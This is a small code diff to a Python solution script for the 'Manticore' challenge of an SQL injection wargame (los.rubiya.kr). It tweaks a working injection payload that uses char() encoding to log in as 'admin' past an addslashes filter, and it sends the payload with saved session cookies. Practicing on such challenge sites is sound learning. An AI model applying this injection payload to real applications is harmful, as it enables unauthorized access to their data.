@@ -4,7 +4,7 @@ import los
 
 def main():
     '''
-    Manticore
+    Manticore 38
 
     $db = sqlite_open("./db/manticore.db");
     $_GET['id'] = addslashes($_GET['id']);
@@ -19,7 +19,7 @@ def main():
     url = "https://los.rubiya.kr/chall/manticore_f88f07d899ad0fc8738fe3aaacff9974.php"
     cook = los.check_cookies(url)
 
-    param = dict(id="\' or id=char(97,100,109,105,110)-- ")
+    param = dict(id="' or id=char(97,100,109,105,110)-- ")
 
     response = los.get_request(url, param, cook)
 
